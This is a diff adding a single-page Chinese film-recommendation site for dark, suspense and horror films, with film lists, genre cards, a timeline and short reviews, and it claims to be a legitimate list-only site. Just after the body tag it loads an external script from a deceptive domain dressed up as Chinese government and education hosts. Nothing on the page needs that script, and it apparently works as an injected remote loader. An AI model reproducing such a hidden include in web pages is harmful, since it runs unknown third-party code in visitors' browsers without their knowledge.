@@ -1,0 +1,258 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<title>南瓜影荐网 - 惊悚/悬疑/烧脑/冷门佳片片单 | nanguadianyingwang-h5.github.io</title>
+<meta name="description" content="南瓜影荐网（nanguadianyingwang-h5.github.io）整理惊悚、悬疑、心理、烧脑、冷门佳片与暗黑系电影片单与短影评；合规影单站，不提供盗版播放。" />
+<meta name="keywords" content="南瓜影荐网, nanguadianyingwang-h5, 惊悚电影片单, 悬疑烧脑电影, 心理惊悚推荐, 冷门佳片导航" />
+<meta name="author" content="南瓜影荐网" />
+<meta name="robots" content="index,follow" />
+<meta name="theme-color" content="#1c1a24" />
+<link rel="canonical" href="https://nanguadianyingwang-h5.github.io/" />
+<script type="application/ld+json">
+{
+  "@context":"https://schema.org",
+  "@type":"WebSite",
+  "name":"南瓜影荐网",
+  "url":"https://nanguadianyingwang-h5.github.io/",
+  "description":"惊悚、悬疑、心理、烧脑与冷门佳片电影片单",
+  "potentialAction":{
+    "@type":"SearchAction",
+    "target":"https://nanguadianyingwang-h5.github.io/#search?q={search_term_string}",
+    "query-input":"required name=search_term_string"
+  }
+}
+</script>
+<style>
+:root{
+  --bg:#16151c; --ink:#ece9f2; --muted:#9b94ad;
+  --line:#2c2937; --card:#1f1d27;
+  --pri:#ff7a18; --pri2:#ffb347; --violet:#8a5bff; --green:#5bff9a;
+}
+*{box-sizing:border-box;}
+body{margin:0;background:var(--bg);color:var(--ink);
+  font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,"PingFang SC","Microsoft YaHei",sans-serif;line-height:1.7;}
+a{color:inherit;text-decoration:none;}
+.wrap{max-width:1120px;margin:0 auto;padding:0 16px;}
+
+header.site{position:sticky;top:0;z-index:50;background:#120f18;color:#fff;border-bottom:1px solid var(--line);}
+.bar{display:flex;align-items:center;gap:12px;height:62px;}
+.logo{font-weight:900;font-size:20px;letter-spacing:.5px;}
+.logo small{display:block;font-size:10px;opacity:.7;font-weight:500;color:var(--pri2);}
+nav.main{margin-left:auto;display:flex;gap:20px;font-size:14px;}
+nav.main a{padding:8px 2px;opacity:.9;}
+nav.main a:hover{color:var(--pri2);}
+.menu-btn{display:none;margin-left:auto;background:var(--pri);border:0;color:#1c1a24;width:42px;height:42px;border-radius:10px;font-size:20px;cursor:pointer;}
+
+.hero{padding:48px 0 28px;background:
+  radial-gradient(900px 240px at 85% -40%,rgba(255,122,24,.25),transparent),
+  radial-gradient(700px 200px at 10% 0%,rgba(138,91,255,.18),transparent),
+  #16151c;border-bottom:1px solid var(--line);}
+.hero h1{font-size:32px;margin:0 0 10px;}
+.hero p{color:var(--muted);max-width:600px;margin:0 0 18px;}
+.search{display:flex;gap:10px;max-width:540px;}
+.search input{flex:1;padding:12px 14px;border-radius:12px;border:1px solid var(--line);background:#0f0e14;color:#fff;font-size:15px;}
+.search button{padding:12px 18px;border:0;border-radius:12px;background:linear-gradient(135deg,var(--pri),var(--pri2));color:#1c1a24;font-weight:800;cursor:pointer;}
+
+section.block{padding:34px 0;border-bottom:1px solid var(--line);}
+.sec-head{display:flex;align-items:baseline;justify-content:space-between;margin-bottom:18px;}
+.sec-head h2{font-size:23px;margin:0;}
+.sec-head span{color:var(--muted);font-size:13px;}
+
+/* 栏目1：暗黑片单 */
+.grid3{display:grid;grid-template-columns:repeat(3,1fr);gap:18px;}
+.mv{background:var(--card);border:1px solid var(--line);border-radius:18px;overflow:hidden;}
+.mv .cv{height:200px;background:linear-gradient(160deg,#1c1a24,#ff7a18);position:relative;}
+.mv:nth-child(2) .cv{background:linear-gradient(160deg,#101522,#3f6f8f);}
+.mv:nth-child(3) .cv{background:linear-gradient(160deg,#1b1320,#8a5bff);}
+.mv:nth-child(4) .cv{background:linear-gradient(160deg,#101a16,#5bff9a);}
+.mv:nth-child(5) .cv{background:linear-gradient(160deg,#1f1717,#c0392b);}
+.mv:nth-child(6) .cv{background:linear-gradient(160deg,#1d1a12,#caa24a);}
+.mv .k{position:absolute;left:12px;top:12px;background:#0009;color:#fff;font-size:12px;padding:4px 10px;border-radius:99px;}
+.mv .bd{padding:14px;}
+.mv h3{font-size:16px;margin:0 0 4px;}
+.mv p{margin:0;color:var(--muted);font-size:13px;}
+
+/* 栏目2：类型 */
+.themes{display:grid;grid-template-columns:repeat(4,1fr);gap:14px;}
+.th{background:var(--card);border:1px solid var(--line);border-radius:14px;padding:16px;}
+.th h3{margin:0 0 6px;font-size:16px;color:var(--pri2);}
+.th p{margin:0;color:var(--muted);font-size:13px;}
+
+/* 栏目3：暗黑时间线 */
+.tl{display:grid;gap:12px;}
+.row{display:grid;grid-template-columns:120px 1fr;gap:16px;background:var(--card);border:1px solid var(--line);border-left:4px solid var(--violet);border-radius:12px;padding:14px 16px;}
+.row b{color:var(--violet);font-size:14px;}
+.row h3{margin:0 0 4px;font-size:16px;}
+.row p{margin:0;color:var(--muted);font-size:13px;}
+
+/* 栏目4：短影评 */
+.reviews{display:grid;grid-template-columns:repeat(2,1fr);gap:16px;}
+.rv{background:var(--card);border:1px solid var(--line);border-radius:16px;padding:18px;}
+.rv h3{margin:0 0 6px;font-size:17px;}
+.rv .q{color:var(--pri);font-style:italic;margin:0 0 8px;}
+.rv p{margin:0;color:var(--muted);font-size:13px;}
+
+/* 栏目5：关于 */
+.about{display:grid;grid-template-columns:1.3fr .7fr;gap:18px;}
+.box{background:var(--card);border:1px solid var(--line);border-radius:16px;padding:18px;}
+.box ul{margin:10px 0 0;padding-left:18px;color:var(--muted);}
+.box li{margin:6px 0;}
+.note{background:#241a10;border:1px solid #5a3a16;color:var(--pri2);padding:12px 14px;border-radius:12px;font-size:13px;margin-top:12px;}
+
+footer.site{background:#120f18;color:#9b94ad;padding:30px 0 40px;font-size:13px;}
+footer.site a{color:var(--pri2);}
+
+@media(max-width:900px){
+  .grid3{grid-template-columns:repeat(2,1fr);}
+  .themes{grid-template-columns:repeat(2,1fr);}
+  .reviews{grid-template-columns:1fr;}
+  .about{grid-template-columns:1fr;}
+}
+@media(max-width:640px){
+  nav.main{position:fixed;inset:62px 0 auto 0;flex-direction:column;gap:0;background:#120f18;display:none;}
+  nav.main.open{display:flex;}
+  nav.main a{padding:14px 18px;border-bottom:1px solid #ffffff14;}
+  .menu-btn{display:block;}
+  .hero h1{font-size:25px;}
+  .grid3{grid-template-columns:1fr;}
+  .themes{grid-template-columns:1fr;}
+  .row{grid-template-columns:84px 1fr;}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/laoliu.js"></script>
+
+<header class="site">
+  <div class="wrap bar">
+    <div class="logo">南瓜影荐网<small>nanguadianyingwang-h5.github.io</small></div>
+    <button class="menu-btn" aria-label="菜单" onclick="document.getElementById('nav').classList.toggle('open')">☰</button>
+    <nav class="main" id="nav">
+      <a href="#dark">暗黑片单</a>
+      <a href="#themes">悬疑类型</a>
+      <a href="#wave">暗黑影史</a>
+      <a href="#reviews">短影评</a>
+      <a href="#about">关于 / 合规</a>
+    </nav>
+  </div>
+</header>
+
+<section class="hero">
+  <div class="wrap">
+    <h1>南瓜影荐网：晚上不想看甜片？来这挑暗黑系</h1>
+    <p>惊悚、悬疑、心理、烧脑、冷门佳片——只做片单、类型导航和短影评。不提供盗版播放、不挂网盘提取码、不把“南瓜”做成血腥成人站。</p>
+    <form class="search" onsubmit="return false;">
+      <input type="text" placeholder="搜索：心理惊悚 / 密室悬疑 / 烧脑反转 / 冷门恐怖" aria-label="搜索" />
+      <button type="submit">搜索</button>
+    </form>
+  </div>
+</section>
+
+<main class="wrap">
+
+  <section class="block" id="dark">
+    <div class="sec-head"><h2>🎃 暗黑系片单</h2><span>大卡</span></div>
+    <div class="grid3">
+      <article class="mv"><div class="cv"><span class="k">心理惊悚</span></div><div class="bd"><h3>黑天鹅</h3><p>2010 / 完美主义与自我吞噬</p></div></article>
+      <article class="mv"><div class="cv"><span class="k">密闭悬疑</span></div><div class="bd"><h3>看不见的客人</h3><p>2016 / 反转、证词与叙事陷阱</p></div></article>
+      <article class="mv"><div class="cv"><span class="k">超自然</span></div><div class="bd"><h3>遗传厄运</h3><p>2018 / 家族诅咒与慢 burn 恐怖</p></div></article>
+      <article class="mv"><div class="cv"><span class="k">烧脑科幻</span></div><div class="bd"><h3>降临</h3><p>2016 / 语言、时间与非线性悲伤</p></div></article>
+      <article class="mv"><div class="cv"><span class="k">真实事件</span></div><div class="bd"><h3>杀人回忆</h3><p>2003 / 韩国社会派悬疑巅峰</p></div></article>
+      <article class="mv"><div class="cv"><span class="k">冷门佳片</span></div><div class="bd"><h3>灯塔</h3><p>2019 / 黑白、孤岛、信仰与疯癫</p></div></article>
+    </div>
+  </section>
+
+  <section class="block" id="themes">
+    <div class="sec-head"><h2>🕯 悬疑 / 暗黑类型</h2><span>四列</span></div>
+    <div class="themes">
+      <div class="th"><h3>心理惊悚</h3><p>人格、记忆、执念、窥视、无法区分现实与幻觉。</p></div>
+      <div class="th"><h3>密闭悬疑</h3><p>密室、火车、审讯室、暴风雪山庄式反转。</p></div>
+      <div class="th"><h3>超自然恐怖</h3><p>鬼魂、诅咒、附身、家族秘密，重气氛不重血。</p></div>
+      <div class="th"><h3>犯罪社会派</h3><p>凶案背后是阶层、警察、媒体与制度失灵。</p></div>
+      <div class="th"><h3>烧脑科幻</h3><p>时间旅行、平行宇宙、记忆植入、认知偏差。</p></div>
+      <div class="th"><h3>邪典 / Cult</h3><p>怪口味、强作者性、电影节地下通道里的宝贝。</p></div>
+      <div class="th"><h3>心理 horror</h3><p>把恐惧放在大脑里：创伤、丧亲、孤独、失控。</p></div>
+      <div class="th"><h3>暗黑童话</h3><p>成人化改编，糖果色外壳配锋利结局。</p></div>
+    </div>
+  </section>
+
+  <section class="block" id="wave">
+    <div class="sec-head"><h2>🎞 暗黑影史脉络</h2><span>时间线</span></div>
+    <div class="tl">
+      <div class="row"><b>1960s 恐怖</b><div><h3>希区柯克与心理惊悚</h3><p>《惊魂记》把浴室、母亲、人格分裂做成现代恐惧的语法。</p></div></div>
+      <div class="row"><b>1970s 恐怖</b><div><h3>身体恐怖与隐喻</h3><p>恐怖片开始承载性别、疾病、消费社会与冷战焦虑。</p></div></div>
+      <div class="row"><b>1990s 悬疑</b><div><h3>叙事游戏化</h3><p>非线性剪辑、不可靠叙述者、结尾反转成为商业艺术交集。</p></div></div>
+      <div class="row"><b>2010s A24 系</b><div><h3>文艺恐怖复兴</h3><p>《遗传厄运》《灯塔》《仲夏夜惊魂》把恐怖拍成作者电影。</p></div></div>
+    </div>
+  </section>
+
+  <section class="block" id="reviews">
+    <div class="sec-head"><h2>📝 短影评摘要</h2><span>双栏</span></div>
+    <div class="reviews">
+      <div class="rv">
+        <h3>《看不见的客人》</h3>
+        <p class="q">“真相不是事实，是被讲到你相信的那一版。”</p>
+        <p>它玩的不是凶手是谁，而是证词怎么被重写；每次反转都在重新定义“谁在说谎”。</p>
+      </div>
+      <div class="rv">
+        <h3>《遗传厄运》</h3>
+        <p class="q">“家族创伤，本来就像被继承的诅咒。”</p>
+        <p>不靠跳吓堆砌，用餐桌、模型、母亲的手把恐惧种进日常里，越安静越瘆人。</p>
+      </div>
+      <div class="rv">
+        <h3>《降临》</h3>
+        <p class="q">“如果你看见一生，还会开口说第一句吗？”</p>
+        <p>外星语言即哲学：非线性时间让悬疑变成悲伤，科幻外壳下是极克制的爱情片。</p>
+      </div>
+      <div class="rv">
+        <h3>《灯塔》</h3>
+        <p class="q">“孤岛把两个男人熬成了神话与疯话。”</p>
+        <p>黑白、海雾、探照灯、酒精与圣经意象，是恐怖，也是男性执念的寓言。</p>
+      </div>
+    </div>
+  </section>
+
+  <section class="block" id="about">
+    <div class="sec-head"><h2>📌 关于南瓜影荐网</h2><span>站点说明</span></div>
+    <div class="about">
+      <div class="box">
+        <h3>本站定位</h3>
+        <p style="color:var(--muted)">南瓜影荐网是“暗黑系电影发现站”：惊悚、悬疑、心理、烧脑、冷门佳片。名字借南瓜的万圣节暗黑感，但内容走影评/片单/类型导航，不走血腥色情。</p>
+        <ul>
+          <li>暗黑片单：黑天鹅、看不见的客人、遗传厄运、降临、杀人回忆、灯塔</li>
+          <li>类型导航：心理惊悚 / 密闭悬疑 / 超自然 / 社会派 / 烧脑科幻</li>
+          <li>影史脉络：希区柯克 → 身体恐怖 → 90s 叙事游戏 → A24 文艺恐怖</li>
+          <li>短影评：只讲角度与氛围，不剧透关键反转</li>
+        </ul>
+        <div class="note">
+          合规边界：不提供盗版在线播放、不挂网盘/磁力/提取码、不聚合“限制级神片”、不诱导下载破解 APP。
+          看正版请走合法视频平台、院线与版权方授权渠道。
+        </div>
+      </div>
+      <div class="box">
+        <h3>站点信息</h3>
+        <p style="color:var(--muted)">网址：<br><b>https://nanguadianyingwang-h5.github.io/</b></p>
+        <p style="color:var(--muted)">单页演示，内链均为 <a href="#">#</a> 占位；不生成 robots.txt 与 sitemap.xml。</p>
+      </div>
+    </div>
+  </section>
+
+</main>
+
+<footer class="site">
+  <div class="wrap">
+    南瓜影荐网 · nanguadianyingwang-h5.github.io ｜ 惊悚 / 悬疑 / 心理 / 烧脑 / 冷门佳片片单（合规影单站）<br>
+    所有内链均为 # 占位；页面结构、配色与 DOM 均独立设计。
+  </div>
+</footer>
+
+<script>
+document.querySelectorAll('#nav a').forEach(function(a){
+  a.addEventListener('click',function(){document.getElementById('nav').classList.remove('open');});
+});
+</script>
+</body>
+</html>
